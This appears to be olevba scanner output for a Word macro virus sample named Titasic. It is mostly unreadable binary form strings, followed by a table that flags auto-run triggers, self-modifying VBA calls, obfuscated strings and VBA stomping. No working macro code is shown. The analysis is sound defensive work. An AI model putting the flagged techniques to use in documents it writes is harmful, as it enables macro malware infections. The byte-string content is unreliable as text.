1hE\�>W�9O�C^�_~���֨�����@_�@a�1X�3[�7]�Ae�Mq�R~�g��o��~�ш�ٖ�ߚ���������犲�}��o��a��Ir�Ej�/V�-N�'Hu'@p*=^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3r$:y&<}.C�7N�Ia�m��&=t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7u2K�Ke�v�ƞ��������(EwC`�=\�Eb�Gk�Nn�c��o��~�ȅ�ї�ើ��������������������萱݀��w��c��[z�Gi�<[�0Ly/@m0<a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2q 3u!6w
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3r#6w(:�-B�2J�Ma�t��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#^+9v-=y!6t3K�Pi���޼�����Nc�Of�Zm�dy�t��}��ʑ�Ԝ�ݪ�������������������������������������ㄠ�v��c��Ww�Qh�L_�GTx
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6t#9x$8v#5x#8{(@8J�K]�Tg�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A(9r>Q�0;~CQ�kz����������Ti�q��~�ć�ȑ�ԟ�ݪ���������������������������l|�ew�h~���ʫ���������䋦�{��m��bx�aq�`k�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2q!6t%9x%9x#4z#9x*@�4H�;L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0w}�=I�mu����������r����ک������������������郝�M\�-=l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[ 7e":h'@i
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1BmF_���Ȭ��ލ����|��u��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(`!1n 4s#7u';z';z"8v(={,A}3I�6L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+d$-d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B7>r���_f���Ӵ�����p��m��������������������FY� 7e
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0a$7e#5d$7e
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-\!8g%<j#:c	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=;Or*Bg
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;+Am��⣽雭ܘ�ԍ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(]'2p(3v)7y0;~0;~.<~-;}/C�:O�DR�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-o?F�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?gq���ٶ���������Sf�]l�Kb�r����Ͱ�����d}�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3^,Fr3My2Ly 8d"9a 5b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"Rk{������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,_%3o)7y+9|/=0>�+?}0?;H�ET�O\�$1qFK�$+h1:q��ղ����������2A�HY�AQ�Zk�������k|�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0V5Nw1Kr
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5b">k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)T@Ol
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*[(7n/9|2;~6=�:@�7H�>K�N[�`j�nv�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'_NU�mu����aj�������QW�GT�DR�Wb�HV����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.S	#I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-[9N}5K|"3e'7g3An
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)CH\t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Y.;m2={4?}<C�>F�GS�NZ�^k��Ǐ��DN�hr���������������ܖ��z��dp�=J���Ż�����l��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A"8d<W�4Lx"9i0Fr#:b
$I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*Z8I{1Gz5I�8L�ES�fq�{����۸����x��`p�������_o�h��{��w��h{�9L�cs����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2[=U�3Nw!<g:Sz
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8!1a;M~8I�=N�@S�N^�w����ҵ�����������ev����6E}Ue�t��~��t��5I�I^�y��������[w�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@!7a?X�0Gp$>c7Nv
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 D	#H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)C���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.U9V�Me�Rk�_r���Ƕ�����������������Tj�7I?S�Pf�F]�Gb�h��/G�}�Ȱ��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 >+Bd'@b	!A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7Y*L
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:a!Bh!>d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7Y(Cg>Tw,B`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
42Mk4Rt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&M.MxTs�`����Ի�����������������Hc�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8q#<zKk�n��5Q�6S�<]�Rq����������{��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?d"Bc
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6X$Bc
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=fMm�{�����������������j��5V�Mj�If�Gg�j��j��)K�1V�[}���Ի��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/Q&I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2W+S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Q!@_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0O0Pq
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-WEa�}��������������Us�D_�Tx�p��c��q�Ð�厫�)K�Be�u�ǜ��������Sw�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?c"Bc%Eg
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3S BY
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$?*Jk!>c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!BS7Tj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1H3JdSl�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4O+BcJd�3Ig
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2AW{s��cz�/Ff
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!G3LsPm�`|�h����ʓ�ً��A\�9R�Li�m����޺��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,G#?X.Id1Kd@Zs)B\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.B(BY?WnF\t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'=!;O3H`*=V3Jd
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
":$7P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&=+=S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

